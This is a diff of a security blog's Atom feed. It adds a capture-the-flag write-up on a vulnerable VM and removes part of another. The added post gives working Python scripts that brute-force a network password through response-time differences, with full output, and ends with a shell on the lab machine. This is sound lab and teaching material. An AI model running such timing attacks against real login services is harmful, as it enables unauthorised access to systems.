@@ -4,7 +4,7 @@
   <title><![CDATA[Category: vm's | FourFourFourFour]]></title>
   <link href="http://recrudesce.github.io/blog/categories/vms/atom.xml" rel="self"/>
   <link href="http://recrudesce.github.io/"/>
-  <updated>2015-01-06T12:59:25+00:00</updated>
+  <updated>2015-01-06T12:59:38+00:00</updated>
   <id>http://recrudesce.github.io/</id>
   <author>
     <name><![CDATA[recrudesce]]></name>
@@ -12,6 +12,317 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Stealing the Fire from Heaven]]></title>
+    <link href="http://recrudesce.github.io/2015/01/06/stealing-the-fire-from-heaven/"/>
+    <updated>2015-01-06T12:41:45+00:00</updated>
+    <id>http://recrudesce.github.io/2015/01/06/stealing-the-fire-from-heaven</id>
+    <content type="html"><![CDATA[<p>c0ne surprised us all by releasing Pandora&rsquo;s Box, which is a VM geared more towards exploit dev, and breaks the norm for vulnerable VM&rsquo;s, as it doesn&rsquo;t start with a website !</p>
+
+<p>There are 5 challenges, I am going to post them as I crack them.</p>
+
+<!-- more -->
+
+
+<h1>NMAPing</h1>
+
+<p>NMAP shows that only 2 ports are open, 22 and 54311.  22 is obviously SSH, whereas 54311 is&hellip; ?</p>
+
+<pre><code class="bash">root@kali:~# nc -nv 172.16.231.133 54311
+(UNKNOWN) [172.16.231.133] 54311 (?) open
+#######################
+# Secure Remote Shell #
+#######################
+Welcome, please log in
+Password: 
+</code></pre>
+
+<p>OK, we don&rsquo;t know the password, and bruting it might be a bit excessive (though I did run it through rockyou to no avail).
+I spent a lot of time looking at this, and found out that the response time for a password of &ldquo;a&rdquo; was a lot quicker than the response time for a password of &ldquo;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&rdquo;.  Maybe the application is parsing the password, and the answer is a timing thing ?  Maybe I can work out the characters based on how quick the application responds to my input.</p>
+
+<p>I wrote the following Python script to get an idea of timings for each letter while trying to guess the first character of the password</p>
+
+<pre><code class="python">#!/usr/bin/python
+import socket, time, string, numpy
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('172.16.231.133', 54311))
+data = s.recv(1024)
+
+discovered = ''
+for charact in (string.ascii_letters + string.digits):
+        #print charact + ": "
+        t_start = time.time()
+        s.send(discovered+charact+"\n")
+        s.recv(200)
+        avg1 = time.time() - t_start
+        t_start = time.time()
+        s.send(discovered+charact+"\n")
+        s.recv( 200)
+        avg2 =  time.time() - t_start
+        t_start = time.time()
+        s.send(discovered+charact+"\n")
+        s.recv(200)
+        avg3 = time.time() - t_start
+        t_start = time.time()
+        s.send(discovered+charact+"\n")
+        s.recv(200)
+        avg4 = time.time() - t_start
+        t_start = time.time()
+        s.send(discovered+charact+"\n")
+        s.recv(200)
+        avg5 = time.time() - t_start
+        avg = [avg1, avg2, avg3, avg4, avg5]
+        letter_avg = numpy.mean(avg)
+        print "Letter was ", charact
+        print "Average Response Time was ", letter_avg
+
+s.close()
+</code></pre>
+
+<p>This produces an output like the following</p>
+
+<pre><code class="bash">root@kali:~# python p_brute_orig.py 
+Letter was  a
+Average Response Time was  0.0023332118988
+Letter was  b
+Average Response Time was  0.00323195457458
+Letter was  c
+Average Response Time was  0.00442881584167
+Letter was  d
+Average Response Time was  0.0055835723877
+Letter was  e
+Average Response Time was  0.00556244850159
+Letter was  f
+Average Response Time was  0.00555896759033
+Letter was  g
+Average Response Time was  0.00557055473328
+Letter was  h
+Average Response Time was  0.00552549362183
+Letter was  i
+Average Response Time was  0.00559639930725
+Letter was  j
+Average Response Time was  0.00569343566895
+Letter was  k
+Average Response Time was  0.0055552482605
+Letter was  l
+Average Response Time was  0.00555882453918
+Letter was  m
+Average Response Time was  0.00554141998291
+Letter was  n
+Average Response Time was  0.00553069114685
+Letter was  o
+Average Response Time was  0.00558443069458
+Letter was  p
+Average Response Time was  0.00567922592163
+Letter was  q
+Average Response Time was  0.00569257736206
+Letter was  r
+Average Response Time was  0.00562338829041
+Letter was  s
+Average Response Time was  0.00555768013
+Letter was  t
+Average Response Time was  0.00551896095276
+Letter was  u
+Average Response Time was  0.00558457374573
+Letter was  v
+Average Response Time was  0.00552611351013
+Letter was  w
+Average Response Time was  0.0056640625
+Letter was  x
+Average Response Time was  0.00559020042419
+Letter was  y
+Average Response Time was  0.00556983947754
+Letter was  z
+Average Response Time was  0.0055579662323
+Letter was  A
+Average Response Time was  0.00563950538635
+Letter was  B
+Average Response Time was  0.00558362007141
+Letter was  C
+Average Response Time was  0.00551657676697
+Letter was  D
+Average Response Time was  0.00559396743774
+Letter was  E
+Average Response Time was  0.00555233955383
+Letter was  F
+Average Response Time was  0.00552496910095
+Letter was  G
+Average Response Time was  0.0056010723114
+Letter was  H
+Average Response Time was  0.00555467605591
+Letter was  I
+Average Response Time was  0.00554819107056
+Letter was  J
+Average Response Time was  0.0055504322052
+Letter was  K
+Average Response Time was  0.0055513381958
+Letter was  L
+Average Response Time was  0.00563497543335
+Letter was  M
+Average Response Time was  0.00555872917175
+Letter was  N
+Average Response Time was  0.00555291175842
+Letter was  O
+Average Response Time was  0.00559086799622
+Letter was  P
+Average Response Time was  0.00557198524475
+Letter was  Q
+Average Response Time was  0.00560660362244
+Letter was  R
+Average Response Time was  0.00022120475769
+Letter was  S
+Average Response Time was  0.00557827949524
+Letter was  T
+Average Response Time was  0.00575833320618
+Letter was  U
+Average Response Time was  0.00554366111755
+Letter was  V
+Average Response Time was  0.00558371543884
+Letter was  W
+Average Response Time was  0.00558462142944
+Letter was  X
+Average Response Time was  0.0055365562439
+Letter was  Y
+Average Response Time was  0.00553660392761
+Letter was  Z
+Average Response Time was  0.00557827949524
+Letter was  0
+Average Response Time was  0.00571899414063
+Letter was  1
+Average Response Time was  0.00560522079468
+Letter was  2
+Average Response Time was  0.00571160316467
+Letter was  3
+Average Response Time was  0.00554060935974
+Letter was  4
+Average Response Time was  0.00556144714355
+Letter was  5
+Average Response Time was  0.00556697845459
+Letter was  6
+Average Response Time was  0.0057119846344
+Letter was  7
+Average Response Time was  0.00571260452271
+Letter was  8
+Average Response Time was  0.00565023422241
+Letter was  9
+Average Response Time was  0.0055832862854
+</code></pre>
+
+<p>It is sensible to hazard a guess that the first password is &ldquo;R&rdquo;, due to it responding a lot quicker than all other characters attempted.  I then wrapped this into a script to brute the whole password</p>
+
+<pre><code class="python">#!/usr/bin/python
+import socket, time, string, numpy
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('172.16.231.133', 54311))
+data = s.recv(1024)
+
+discovered = ''
+for charnum in range (0, 100):
+
+        for charact in (string.ascii_letters + string.digits):
+                t_start = time.time()
+                s.send(discovered+charact+"\n")
+                s.recv(200)
+                avg1 = time.time() - t_start
+                t_start = time.time()
+                s.send(discovered+charact+"\n")
+                s.recv( 200)
+                avg2 =  time.time() - t_start
+                t_start = time.time()
+                s.send(discovered+charact+"\n")
+                s.recv(200)
+                avg3 = time.time() - t_start
+                t_start = time.time()
+                s.send(discovered+charact+"\n")
+                s.recv(200)
+                avg4 = time.time() - t_start
+                t_start = time.time()
+                s.send(discovered+charact+"\n")
+                prompt = s.recv(200)
+                avg5 = time.time() - t_start
+                avg = [avg1, avg2, avg3, avg4, avg5]
+                letter_avg = numpy.mean(avg)
+                if letter_avg &lt; 0.001:
+                        print "Letter", charnum, "is", charact
+                        discovered = discovered + charact
+                        break
+        if 'Invalid' in prompt:
+                meh = ''
+        else:
+                print "Got a successful login !"
+                break;
+s.close()
+print "Password is: ", discovered
+</code></pre>
+
+<p>This script produces the following output</p>
+
+<pre><code class="bash">root@kali:~# python p_brute2.py
+Letter 1 is R
+Letter 2 is 3
+Letter 3 is s
+Letter 4 is p
+Letter 5 is 3
+Letter 6 is c
+Letter 7 is t
+Letter 8 is Y
+Letter 9 is 0
+Letter 10 is 4
+Letter 11 is r
+Letter 12 is 4
+Letter 13 is d
+Letter 14 is m
+Letter 15 is 1
+Letter 16 is n
+Letter 17 is i
+Letter 18 is S
+Letter 19 is t
+Letter 20 is 4
+Letter 21 is t
+Letter 22 is 0
+Letter 23 is r
+Letter 24 is L
+Letter 25 is 1
+Letter 26 is k
+Letter 27 is e
+Letter 28 is Y
+Letter 29 is o
+Letter 30 is 4
+Letter 31 is R
+Letter 32 is 3
+Letter 33 is s
+Letter 34 is p
+Letter 35 is e
+Letter 36 is c
+Letter 37 is t
+Letter 38 is Y
+Letter 39 is 0
+Letter 40 is 4
+Letter 41 is r
+Letter 42 is G
+Letter 43 is 0
+Letter 44 is d
+Got a successful login !
+Password is:  R3sp3ctY04r4dm1niSt4t0rL1keYo4R3spectY04rG0d
+</code></pre>
+
+<p>Once the bruted password is entered into the application, we&rsquo;re provided with a shell.</p>
+
+<pre><code class="bash">root@kali:~# nc -nv 172.16.231.133 54311
+(UNKNOWN) [172.16.231.133] 54311 (?) open
+#######################
+# Secure Remote Shell #
+#######################
+Welcome, please log in
+Password: R3sp3ctY04r4dm1niSt4t0rL1keYo4R3spectY04rG0d
+Logged in successfully, type exit to close the shell
+Shell$ 
+</code></pre>
+
+<p>Onto the next step !</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Because she was a princess she had a Pegasus.]]></title>
@@ -1967,1454 +2278,6 @@ a70354f0258dcc00292c72aab3c8b1e4
 </code></pre>
 
 <p><img src="http://cdn-media-2.lifehack.org/wp-content/files/2014/08/Getting-it-done-gif.gif" alt="" /></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[How Many Hackers Does It Take To Change A Lightbulb ?]]></title>
-    <link href="http://recrudesce.github.io/2014/08/13/how-many-hackers-does-it-take-to-change-a-lightbulb/"/>
-    <updated>2014-08-13T01:00:28+01:00</updated>
-    <id>http://recrudesce.github.io/2014/08/13/how-many-hackers-does-it-take-to-change-a-lightbulb</id>
-    <content type="html"><![CDATA[<p>Whilst in the middle of cracking <a href="http://vulnhub.com/entry/xerxes-2,97/">Xerxes2</a>, <a href="https://twitter.com/leonjza">leonjza</a> decided to release <a href="http://vulnhub.com/entry/flick-1,99/">Flick</a> - a CTF that is sure to tax minds.  Naturally I decided to make myself feel like an unskilled loser, and downloaded it. Here&rsquo;s the story of how I rooted Flick first.</p>
-
-<p><blockquote><p>root@flick:~# id<br/>uid=0(root) gid=0(root) groups=0(root)<br/>First ! @leonjza @VulnHub #flick #boot2root #vulnhub</p><footer><strong>recrudesce <a href="https://twitter.com/recrudesce/statuses/499168321150124033">https://twitter.com/recrudesce/statuses/499168321150124033</a></strong></footer></blockquote></p>
-
-<!-- more -->
-
-
-<h2>&lsquo;Avin&rsquo; a Butchers</h2>
-
-<p>Blah blah NMAP blah ;)</p>
-
-<pre><code class="bash">root@pwk:~# nmap -sS -O -p1-65535 -T4 192.168.0.106
-
-Starting Nmap 6.46 ( http://nmap.org ) at 2014-08-08 22:39 BST
-Nmap scan report for 192.168.0.106
-Host is up (0.00s latency).
-Not shown: 65533 closed ports
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   1024 04:d0:8d:4d:ee:87:30:e7:60:82:63:d3:a8:6e:4b:ac (DSA)
-|   2048 64:ec:a9:9b:0b:c0:11:d4:08:63:cf:83:e1:db:23:9a (RSA)
-|_  256 2d:32:93:ce:0e:54:3f:84:ee:01:c7:c0:bb:68:e2:02 (ECDSA)
-8881/tcp open  unknown
-
-Network Distance: 1 hop
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre>
-
-<p>SSH and a random unknown port - ominous. A quick netcat to the port presents us with a request for a password</p>
-
-<pre><code class="bash">root@pwk:~# nc 192.168.0.106 8881
-Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
-&gt;
-</code></pre>
-
-<p>Anything you type in just gets repeated back to you. I also checked for buffer overflows and format string vulns, but no avail - looks like I need a password.</p>
-
-<pre><code class="bash">Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
-&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-OK: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-
-&gt; %s%s%s%s
-OK: %s%s%s%s
-
-&gt; wut ?
-OK: wut ?
-
-&gt; 
-</code></pre>
-
-<p><img src="http://static.fjcdn.com/gifs/MFW+someone+tries+to+open+IE.+that+makes+me+a_c3c81f_4698730.gif" alt="" /></p>
-
-<p>OK, so not knowing the password, I decided to check out SSH.</p>
-
-<pre><code class="bash">root@pwk:~# ssh blah@192.168.0.106
-
-\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34
-\x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
-\x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68
-\x4d\x6b\x30\x78\x56\x6d\x70\x4b\x53\x31\x49\x79\x53\x6b\x56\x55\x62\x47\x68\x6f
-\x54\x56\x68\x43\x55\x56\x5a\x74\x65\x46\x5a\x6c\x52\x6c\x6c\x35\x56\x47\x74\x73
-\x61\x6c\x4a\x74\x61\x47\x39\x55\x56\x6d\x68\x44\x56\x56\x5a\x61\x63\x56\x46\x74
-\x52\x6c\x70\x57\x4d\x44\x45\x31\x56\x54\x4a\x30\x56\x31\x5a\x58\x53\x6b\x68\x68
-\x52\x7a\x6c\x56\x56\x6d\x78\x61\x4d\x31\x5a\x73\x57\x6d\x46\x6b\x52\x30\x35\x47
-\x57\x6b\x5a\x53\x54\x6d\x46\x36\x52\x54\x46\x57\x56\x45\x6f\x77\x56\x6a\x46\x61
-\x57\x46\x4e\x72\x61\x47\x68\x53\x65\x6d\x78\x57\x56\x6d\x70\x4f\x54\x30\x30\x78
-\x63\x46\x5a\x58\x62\x55\x5a\x72\x55\x6a\x41\x31\x52\x31\x64\x72\x57\x6e\x64\x57
-\x4d\x44\x46\x46\x55\x6c\x52\x47\x56\x31\x5a\x46\x62\x33\x64\x57\x61\x6b\x5a\x68
-\x56\x30\x5a\x4f\x63\x6d\x46\x48\x61\x46\x4e\x6c\x62\x58\x68\x58\x56\x6d\x30\x78
-\x4e\x46\x6c\x56\x4d\x48\x68\x58\x62\x6b\x35\x59\x59\x6c\x56\x61\x63\x6c\x56\x71
-\x51\x54\x46\x53\x4d\x57\x52\x79\x56\x32\x78\x4f\x56\x57\x4a\x56\x63\x45\x64\x5a
-\x4d\x46\x5a\x33\x56\x6a\x4a\x4b\x56\x56\x4a\x59\x5a\x46\x70\x6c\x61\x33\x42\x49
-\x56\x6d\x70\x47\x54\x32\x52\x57\x56\x6e\x52\x68\x52\x6b\x35\x73\x59\x6c\x68\x6f
-\x57\x46\x5a\x74\x4d\x58\x64\x55\x4d\x56\x46\x33\x54\x55\x68\x6f\x61\x6c\x4a\x73
-\x63\x46\x6c\x5a\x62\x46\x5a\x68\x59\x32\x78\x57\x63\x56\x46\x55\x52\x6c\x4e\x4e
-\x56\x6c\x59\x31\x56\x46\x5a\x53\x55\x31\x5a\x72\x4d\x58\x4a\x6a\x52\x6d\x68\x57
-\x54\x57\x35\x53\x4d\x31\x5a\x71\x53\x6b\x74\x57\x56\x6b\x70\x5a\x57\x6b\x5a\x77
-\x62\x47\x45\x7a\x51\x6b\x6c\x57\x62\x58\x42\x48\x56\x44\x4a\x53\x56\x31\x5a\x75
-\x55\x6d\x68\x53\x61\x7a\x56\x7a\x57\x57\x78\x6f\x62\x31\x64\x47\x57\x6e\x52\x4e
-\x53\x47\x68\x50\x55\x6d\x31\x34\x56\x31\x52\x56\x61\x47\x39\x58\x52\x30\x70\x79
-\x54\x6c\x5a\x73\x57\x6d\x4a\x47\x57\x6d\x68\x5a\x4d\x6e\x68\x58\x59\x7a\x46\x57
-\x63\x6c\x70\x47\x61\x47\x6c\x53\x4d\x31\x46\x36\x56\x6a\x4a\x30\x55\x31\x55\x78
-\x57\x6e\x4a\x4e\x57\x45\x70\x71\x55\x6d\x31\x6f\x56\x31\x52\x58\x4e\x56\x4e\x4e
-\x4d\x56\x70\x78\x55\x32\x74\x30\x56\x31\x5a\x72\x63\x46\x70\x58\x61\x31\x70\x33
-\x56\x6a\x46\x4b\x56\x32\x4e\x49\x62\x46\x64\x57\x52\x55\x70\x6f\x56\x6b\x52\x4b
-\x54\x32\x52\x47\x53\x6e\x4a\x61\x52\x6d\x68\x70\x56\x6a\x4e\x6f\x56\x56\x64\x57
-\x55\x6b\x39\x52\x4d\x57\x52\x48\x56\x32\x35\x53\x54\x6c\x5a\x46\x53\x6c\x68\x55
-\x56\x33\x68\x48\x54\x6c\x5a\x61\x57\x45\x35\x56\x4f\x56\x68\x53\x4d\x48\x42\x4a
-\x56\x6c\x64\x34\x63\x31\x64\x74\x53\x6b\x68\x68\x52\x6c\x4a\x58\x54\x55\x5a\x77
-\x56\x46\x5a\x71\x52\x6e\x64\x53\x4d\x56\x4a\x30\x5a\x55\x64\x73\x55\x32\x4a\x59
-\x59\x33\x68\x57\x61\x31\x70\x68\x56\x54\x46\x56\x65\x46\x64\x75\x53\x6b\x35\x58
-\x52\x58\x42\x78\x56\x57\x78\x6b\x4e\x47\x46\x47\x56\x58\x64\x68\x52\x55\x35\x55
-\x55\x6d\x78\x77\x65\x46\x55\x79\x64\x47\x46\x69\x52\x6c\x70\x7a\x56\x32\x78\x77
-\x57\x47\x45\x78\x63\x44\x4e\x5a\x61\x32\x52\x47\x5a\x57\x78\x47\x63\x6d\x4a\x47
-\x5a\x46\x64\x4e\x4d\x45\x70\x4a\x56\x6d\x74\x53\x53\x31\x55\x78\x57\x58\x68\x57
-\x62\x6c\x5a\x57\x59\x6c\x68\x43\x56\x46\x6c\x72\x56\x6e\x64\x57\x56\x6c\x70\x30
-\x5a\x55\x63\x35\x55\x6b\x31\x58\x55\x6e\x70\x57\x4d\x6a\x56\x4c\x56\x30\x64\x4b
-\x53\x46\x56\x74\x4f\x56\x56\x57\x62\x48\x42\x59\x56\x47\x78\x61\x59\x56\x64\x48
-\x56\x6b\x68\x6b\x52\x32\x68\x70\x55\x6c\x68\x42\x64\x31\x64\x57\x56\x6d\x39\x55
-\x4d\x56\x70\x30\x55\x6d\x35\x4b\x54\x31\x5a\x73\x53\x6c\x68\x55\x56\x6c\x70\x33
-\x56\x30\x5a\x72\x65\x46\x64\x72\x64\x47\x70\x69\x56\x6b\x70\x49\x56\x6c\x64\x34
-\x61\x32\x46\x57\x53\x6e\x52\x50\x56\x45\x35\x58\x54\x57\x35\x6f\x57\x46\x6c\x71
-\x53\x6b\x5a\x6c\x52\x6d\x52\x5a\x57\x6b\x55\x31\x56\x31\x5a\x73\x63\x46\x56\x58
-\x56\x33\x52\x72\x56\x54\x46\x73\x56\x31\x56\x73\x57\x6c\x68\x69\x56\x56\x70\x7a
-\x57\x57\x74\x61\x64\x32\x56\x47\x56\x58\x6c\x6b\x52\x45\x4a\x58\x54\x56\x5a\x77
-\x65\x56\x59\x79\x65\x48\x64\x58\x62\x46\x70\x58\x59\x30\x68\x4b\x56\x31\x5a\x46
-\x57\x6b\x78\x57\x4d\x56\x70\x48\x59\x32\x31\x4b\x52\x31\x70\x47\x5a\x45\x35\x4e
-\x52\x58\x42\x4b\x56\x6d\x31\x30\x55\x31\x4d\x78\x56\x58\x68\x58\x57\x47\x68\x68
-\x55\x30\x5a\x61\x56\x6c\x6c\x72\x57\x6b\x74\x6a\x52\x6c\x70\x78\x56\x47\x30\x35
-\x56\x31\x5a\x73\x63\x45\x68\x58\x56\x45\x35\x76\x59\x56\x55\x78\x57\x46\x56\x75
-\x63\x46\x64\x4e\x56\x32\x68\x32\x56\x31\x5a\x61\x53\x31\x49\x78\x54\x6e\x56\x52
-\x62\x46\x5a\x58\x54\x54\x46\x4b\x4e\x6c\x5a\x48\x64\x47\x46\x68\x4d\x6b\x35\x7a
-\x56\x32\x35\x53\x61\x31\x4a\x74\x55\x6e\x42\x57\x62\x47\x68\x44\x54\x6c\x5a\x6b
-\x56\x56\x46\x74\x52\x6d\x70\x4e\x56\x31\x49\x77\x56\x54\x4a\x30\x61\x31\x64\x48
-\x53\x6c\x68\x68\x52\x30\x5a\x56\x56\x6d\x78\x77\x4d\x31\x70\x58\x65\x48\x4a\x6c
-\x56\x31\x5a\x49\x5a\x45\x64\x30\x55\x32\x45\x7a\x51\x58\x64\x58\x62\x46\x5a\x68
-\x59\x54\x4a\x47\x56\x31\x64\x75\x53\x6d\x6c\x6c\x61\x31\x70\x59\x57\x57\x78\x6f
-\x51\x31\x52\x47\x55\x6e\x4a\x58\x62\x45\x70\x73\x55\x6d\x31\x53\x65\x6c\x6c\x56
-\x57\x6c\x4e\x68\x56\x6b\x70\x31\x55\x57\x78\x77\x56\x32\x4a\x59\x55\x6c\x68\x61
-\x52\x45\x5a\x72\x55\x6a\x4a\x4b\x53\x56\x52\x74\x61\x46\x4e\x57\x56\x46\x5a\x61
-\x56\x6c\x63\x78\x4e\x47\x51\x79\x56\x6b\x64\x57\x62\x6c\x4a\x72\x55\x6b\x56\x4b
-\x62\x31\x6c\x59\x63\x45\x64\x6c\x56\x6c\x4a\x7a\x56\x6d\x35\x4f\x57\x47\x4a\x47
-\x63\x46\x68\x5a\x4d\x47\x68\x4c\x56\x32\x78\x61\x57\x46\x56\x72\x5a\x47\x46\x57
-\x56\x31\x4a\x51\x56\x54\x42\x6b\x52\x31\x49\x79\x52\x6b\x68\x69\x52\x6b\x35\x70
-\x59\x54\x42\x77\x4d\x6c\x5a\x74\x4d\x54\x42\x56\x4d\x55\x31\x34\x56\x56\x68\x73
-\x56\x56\x64\x48\x65\x46\x5a\x5a\x56\x45\x5a\x33\x59\x55\x5a\x57\x63\x56\x4e\x74
-\x4f\x56\x64\x53\x62\x45\x70\x5a\x56\x47\x78\x6a\x4e\x57\x45\x79\x53\x6b\x64\x6a
-\x52\x57\x68\x58\x59\x6c\x52\x42\x4d\x56\x5a\x58\x63\x33\x68\x58\x52\x6c\x5a\x7a
-\x59\x55\x5a\x6b\x54\x6c\x59\x79\x61\x44\x4a\x57\x61\x6b\x4a\x72\x55\x7a\x46\x6b
-\x56\x31\x5a\x75\x53\x6c\x42\x57\x62\x48\x42\x76\x57\x56\x52\x47\x64\x31\x4e\x57
-\x57\x6b\x68\x6c\x52\x30\x5a\x61\x56\x6d\x31\x53\x52\x31\x52\x73\x57\x6d\x46\x56
-\x52\x6c\x6c\x35\x59\x55\x5a\x6f\x57\x6c\x64\x49\x51\x6c\x68\x56\x4d\x46\x70\x68
-\x59\x31\x5a\x4f\x63\x56\x56\x73\x57\x6b\x35\x57\x4d\x55\x6c\x33\x56\x6c\x52\x4b
-\x4d\x47\x49\x79\x52\x6b\x64\x54\x62\x6b\x35\x55\x59\x6b\x64\x6f\x56\x6c\x5a\x73
-\x57\x6e\x64\x4e\x4d\x56\x70\x79\x56\x32\x31\x47\x61\x6c\x5a\x72\x63\x44\x42\x61
-\x52\x57\x51\x77\x56\x6a\x4a\x4b\x63\x6c\x4e\x72\x61\x46\x64\x53\x4d\x32\x68\x6f
-\x56\x6b\x52\x4b\x52\x31\x59\x78\x54\x6e\x56\x56\x62\x45\x4a\x58\x55\x6c\x52\x57
-\x57\x56\x64\x57\x55\x6b\x64\x6b\x4d\x6b\x5a\x48\x56\x32\x78\x57\x55\x32\x45\x78
-\x63\x48\x4e\x56\x62\x54\x46\x54\x5a\x57\x78\x73\x56\x6c\x64\x73\x54\x6d\x68\x53
-\x56\x45\x5a\x61\x56\x56\x63\x31\x62\x31\x59\x78\x57\x58\x70\x68\x53\x45\x70\x61
-\x59\x57\x74\x61\x63\x6c\x56\x71\x52\x6c\x64\x6a\x4d\x6b\x5a\x47\x54\x31\x5a\x6b
-\x56\x31\x5a\x47\x57\x6d\x46\x57\x62\x47\x4e\x34\x54\x6b\x64\x52\x65\x56\x5a\x72
-\x5a\x46\x64\x69\x62\x45\x70\x79\x56\x57\x74\x57\x53\x32\x49\x78\x62\x46\x6c\x6a
-\x52\x57\x52\x73\x56\x6d\x78\x4b\x65\x6c\x5a\x74\x4d\x44\x56\x58\x52\x30\x70\x48
-\x59\x30\x5a\x6f\x57\x6b\x31\x48\x61\x45\x78\x57\x4d\x6e\x68\x68\x56\x30\x5a\x57
-\x63\x6c\x70\x48\x52\x6c\x64\x4e\x4d\x6d\x68\x4a\x56\x31\x52\x4a\x65\x46\x4d\x78
-\x53\x58\x68\x6a\x52\x57\x52\x68\x55\x6d\x73\x31\x57\x46\x59\x77\x56\x6b\x74\x4e
-\x62\x46\x70\x30\x59\x30\x56\x6b\x57\x6c\x59\x77\x56\x6a\x52\x57\x62\x47\x68\x76
-\x56\x30\x5a\x6b\x53\x47\x46\x47\x57\x6c\x70\x69\x57\x47\x68\x6f\x56\x6d\x31\x34
-\x63\x32\x4e\x73\x5a\x48\x4a\x6b\x52\x33\x42\x54\x59\x6b\x5a\x77\x4e\x46\x5a\x58
-\x4d\x54\x42\x4e\x52\x6c\x6c\x34\x56\x32\x35\x4f\x61\x6c\x4a\x58\x61\x46\x68\x57
-\x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36
-\x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77
-\x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d
-
- .o88o. oooo   o8o            oooo
- 888 `" `888   `"'            `888
-o888oo   888  oooo   .ooooo.   888  oooo
- 888     888  `888  d88' `"Y8  888 .8P'
- 888     888   888  888        888888.
- 888     888   888  888   .o8  888 `88b.
-o888o   o888o o888o `Y8bod8P' o888o o888o 
-
-blah@192.168.0.106's password: 
-</code></pre>
-
-<p>OK, that&rsquo;s something - I&rsquo;m intrigued to see what the hex decodes to</p>
-
-<pre><code class="bash">root@pwk:~# echo -e "\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34
-&gt; \x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
-&gt; \x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68
-&gt; \x4d\x6b\x30\x78\x56\x6d\x70\x4b\x53\x31\x49\x79\x53\x6b\x56\x55\x62\x47\x68\x6f
-&gt; \x54\x56\x68\x43\x55\x56\x5a\x74\x65\x46\x5a\x6c\x52\x6c\x6c\x35\x56\x47\x74\x73
-&gt; \x61\x6c\x4a\x74\x61\x47\x39\x55\x56\x6d\x68\x44\x56\x56\x5a\x61\x63\x56\x46\x74
-
-************************************** SNIP **************************************
-&gt; \x56\x30\x5a\x6b\x53\x47\x46\x47\x57\x6c\x70\x69\x57\x47\x68\x6f\x56\x6d\x31\x34
-&gt; \x63\x32\x4e\x73\x5a\x48\x4a\x6b\x52\x33\x42\x54\x59\x6b\x5a\x77\x4e\x46\x5a\x58
-&gt; \x4d\x54\x42\x4e\x52\x6c\x6c\x34\x56\x32\x35\x4f\x61\x6c\x4a\x58\x61\x46\x68\x57
-&gt; \x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36
-&gt; \x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77
-&gt; \x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d"
-Vm0wd2QyUXlVWGxWV0d4
-V1YwZDRWMVl3WkRSWFJt
-eFZVMjA1VjAxV2JETlhh
-Mk0xVmpKS1IySkVUbGho
-TVhCUVZteFZlRll5VGts
-alJtaG9UVmhDVVZacVFt
-RlpWMDE1VTJ0V1ZXSkhh
-
-******* SNIP *******
-V0ZkSGFGWlpiWGhoVm14
-c2NsZHJkR3BTYkZwNFZX
-MTBNRll4V25OalJXaFhW
-ak5TVEZsVVFYaFNWa3B6
-Vkd4YVUySkZXWHBXVlZw
-R1QxWkNVbEJVTUQwPQ==
-</code></pre>
-
-<p>Oooh, base64 - this has to be the password !</p>
-
